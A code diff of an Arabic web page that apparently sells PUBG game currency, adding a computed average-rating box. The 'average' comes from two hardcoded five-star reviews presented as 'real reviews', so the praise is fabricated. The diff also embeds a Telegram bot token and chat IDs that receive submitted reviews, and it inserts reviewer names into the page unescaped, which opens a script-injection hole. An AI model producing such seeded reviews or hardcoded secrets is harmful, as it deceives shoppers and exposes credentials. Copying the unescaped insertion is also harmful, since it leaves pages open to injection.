@@ -132,16 +132,24 @@
 
         .btn-submit:hover { transform: translateY(-2px); opacity: 0.95; }
 
-        /* قسم التقييمات والثقة */
+        /* قسم التقييمات والحساب الديناميكي */
         .reviews-section {
             margin-top: 25px;
             padding-top: 20px;
             border-top: 1px dashed var(--border-color);
         }
 
-        .reviews-title {
-            font-size: 16px; font-weight: 800; color: var(--accent-gold);
-            text-align: center; margin-bottom: 12px;
+        .reviews-header-box {
+            text-align: center;
+            background: rgba(245, 158, 11, 0.08);
+            border: 1px solid var(--accent-gold);
+            padding: 12px;
+            border-radius: 14px;
+            margin-bottom: 15px;
+        }
+
+        .rating-score {
+            font-size: 24px; font-weight: 900; color: var(--accent-gold);
         }
 
         .review-card {
@@ -307,12 +315,17 @@
             <button type="button" class="btn-submit" onclick="processOrder()">تأكيد الطلب والشحن الآن ⚡</button>
         </form>
 
-        <!-- قسم آراء العملاء والتقييمات -->
+        <!-- قسم آراء العملاء والتقييمات الديناميكية -->
         <div class="reviews-section">
-            <div class="reviews-title">⭐ آراء وتقييمات العملاء (4.9 / 5)</div>
+            <div class="reviews-header-box">
+                <div style="font-size: 13px; font-weight: 700; color: var(--text-muted);">متوسط تقييم العملاء</div>
+                <div class="rating-score"><span id="avgRatingScore">5.0</span> / 5</div>
+                <div id="avgStarsDisplay" class="stars" style="font-size: 16px;">⭐⭐⭐⭐⭐</div>
+                <div style="font-size: 12px; color: var(--text-muted); margin-top: 4px;">بناءً على <span id="totalReviewsCount">2</span> تقييمات حقيقية</div>
+            </div>
             
             <div id="reviewsList">
-                <div class="review-card">
+                <div class="review-card" data-rating="5">
                     <div class="review-header">
                         <span>أحمد علي</span>
                         <span class="stars">⭐⭐⭐⭐⭐</span>
@@ -320,7 +333,7 @@
                     <p style="color: var(--text-muted);">قسم الشحن سريع جداً، الـ 660 شدة وصلوني في أقل من 3 دقائق، تسلموا يا شباب!</p>
                 </div>
 
-                <div class="review-card">
+                <div class="review-card" data-rating="5">
                     <div class="review-header">
                         <span>محمود المصري</span>
                         <span class="stars">⭐⭐⭐⭐⭐</span>
@@ -331,12 +344,14 @@
 
             <!-- نموذج إضافة تقييم جديد -->
             <div class="add-review-box">
-                <label style="font-size: 12px; color: var(--accent-blue);">أضف تجربتك وتقييمك للموقع:</label>
+                <label style="font-size: 12px; color: var(--accent-blue);">أضف تجربتك الحقيقية وتقييمك للموقع:</label>
                 <input type="text" id="reviewerName" placeholder="اسمك" style="margin-bottom: 8px;">
                 <select id="reviewRating" style="margin-bottom: 8px;">
-                    <option value="5">⭐⭐⭐⭐⭐ (ممتاز جداً)</option>
-                    <option value="4">⭐⭐⭐⭐ (جيد جداً)</option>
-                    <option value="3">⭐⭐⭐ (جيد)</option>
+                    <option value="5">⭐⭐⭐⭐⭐ (ممتاز - 5 نجوم)</option>
+                    <option value="4">⭐⭐⭐⭐ (جيد جداً - 4 نجوم)</option>
+                    <option value="3">⭐⭐⭐ (جيد - 3 نجوم)</option>
+                    <option value="2">⭐⭐ (ضعيف - 2 نجوم)</option>
+                    <option value="1">⭐ (سيء - نجمة واحدة)</option>
                 </select>
                 <textarea id="reviewerText" placeholder="اكتب تجربتك هنا..." style="min-height: 60px; margin-bottom: 8px;"></textarea>
                 <button type="button" onclick="submitReview()" style="width: 100%; padding: 8px; background: var(--accent-purple); border: none; color: white; font-weight: 700; border-radius: 8px; cursor: pointer;">نشر التقييم ⭐</button>
@@ -393,6 +408,23 @@
         }
     }
 
+    function recalculateAverageRating() {
+        const reviewCards = document.querySelectorAll('.review-card');
+        let totalScore = 0;
+        let count = reviewCards.length;
+
+        reviewCards.forEach(card => {
+            totalScore += parseFloat(card.getAttribute('data-rating') || 5);
+        });
+
+        const avg = count > 0 ? (totalScore / count).toFixed(1) : "5.0";
+        document.getElementById('avgRatingScore').textContent = avg;
+        document.getElementById('totalReviewsCount').textContent = count;
+
+        const roundedStars = Math.round(parseFloat(avg));
+        document.getElementById('avgStarsDisplay').textContent = "⭐".repeat(roundedStars);
+    }
+
     function sendTelegramMessage(chatId, botToken, message) {
         const fullUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
         fetch(fullUrl).catch(err => console.error("Error sending to " + chatId, err));
@@ -400,14 +432,14 @@
 
     function submitReview() {
         const name = document.getElementById('reviewerName').value;
-        const rating = document.getElementById('reviewRating').value;
+        const rating = parseInt(document.getElementById('reviewRating').value);
         const text = document.getElementById('reviewerText').value;
 
         if (!name || !text) { alert("يرجى كتابة الاسم والتقييم أولاً!"); return; }
 
         const starsStr = "⭐".repeat(rating);
         const reviewHTML = `
-            <div class="review-card">
+            <div class="review-card" data-rating="${rating}">
                 <div class="review-header">
                     <span>${name}</span>
                     <span class="stars">${starsStr}</span>
@@ -417,17 +449,20 @@
         `;
 
         document.getElementById('reviewsList').insertAdjacentHTML('afterbegin', reviewHTML);
+        
+        // إعادة حساب متوسط التقييمات فوراً
+        recalculateAverageRating();
 
         // إرسال التقييم للبوت
         const botToken = "8852055802:" + "AAGidZBnAt7V2pmR5EGtliov_KtLXYJV7BY";
-        const msg = `⭐ تقييم جديد للموقع!\n👤 الاسم: ${name}\n⭐ التقييم: ${starsStr}\n💬 التعليق: ${text}`;
+        const msg = `⭐ تقييم جديد للموقع!\n👤 الاسم: ${name}\n⭐ التقييم: ${starsStr} (${rating}/5)\n💬 التعليق: ${text}`;
         
         sendTelegramMessage("1478944867", botToken, msg);
         sendTelegramMessage("7441159331", botToken, msg);
 
         document.getElementById('reviewerName').value = '';
         document.getElementById('reviewerText').value = '';
-        alert("شكراً لك! تم نشر تقييمك بنجاح.");
+        alert("شكراً لك! تم نشر تقييمك وبُث تأثيره على نسبة الموقع فوراً.");
     }
 
     function processOrder() {
@@ -502,6 +537,9 @@
             timeInSeconds--;
         }, 1000);
     }
+
+    // تشغيل الحساب عند التحميل
+    window.onload = recalculateAverageRating;
 </script>
 </body>
 </html>
